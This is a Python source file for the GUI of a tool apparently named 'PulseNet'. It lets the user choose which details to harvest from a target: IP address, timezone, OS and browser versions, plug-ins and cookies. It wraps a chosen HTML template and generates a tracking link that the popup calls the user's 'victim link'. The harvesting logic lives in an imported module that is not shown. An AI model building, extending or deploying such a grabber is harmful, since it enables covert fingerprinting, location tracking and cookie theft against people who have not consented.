import PySimpleGUI as sg
from utils import *
import pyperclip

layout = [
    [sg.Text("Select Information to Retrieve:")],
    [sg.Checkbox("IP Address", key="ip")],
    [sg.Checkbox("Timezone", key="timezone")],
    [sg.Checkbox("Date & Time", key="datetime")],
    [sg.Checkbox("Screen Resolution", key="resolution")],
    [sg.Checkbox("Window Size", key="windowsize")],
    [sg.Checkbox("OS Version", key="osversion")],
    [sg.Checkbox("Browser Version", key="browserversion")],
    [sg.Checkbox("Installed Browser Plug-Ins", key="plugins")],
    [sg.Checkbox("Cookies", key="cookies")],
    [sg.Text("Template File"), sg.FileBrowse( key="template")],
    [sg.Button("Generate URL", key="gen"), sg.Button("Exit")]
]

window = sg.Window("PulseNet", layout)

while True:
    event, values = window.read()
    print(event)

    if event == sg.WINDOW_CLOSED or event == "Exit":
        break
    elif event == "gen":
        selected_info = []
        file = values["template"]
        for key in values:
            try:
                if values[key] is True:
                    selected_info.append(key)
            except:
                continue
        
        if selected_info:
            sg.popup("Retrieving the following information:", ', '.join(selected_info))
            write_template_contents_to_assets(file)
            url = generate_url(selected_info)
            pyperclip.copy(url)
            sg.popup(f"Your victim link is: {url}\n\nThe link has been copied to the clipboard.")
        else:
            sg.popup("Please select at least one information type.")

window.close()
